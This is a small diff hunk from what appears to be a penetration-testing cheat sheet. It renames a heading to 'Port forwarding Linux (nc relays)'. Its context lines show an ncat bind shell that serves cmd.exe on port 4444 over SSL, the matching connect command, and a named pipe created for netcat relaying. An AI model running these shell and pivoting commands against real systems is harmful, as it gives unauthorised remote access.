@@ -7,7 +7,7 @@ ncat -nlvp 4444 -e cmd.exe --allow 10.10.10.10 --ssl
 ncat -nv 10.10.10.10 4444 --ssl
 
 
-# Port forwarding Linux
+# Port forwarding Linux (nc relays)
 
 - Create named pipe
     cd /tmp && mknod [name] p
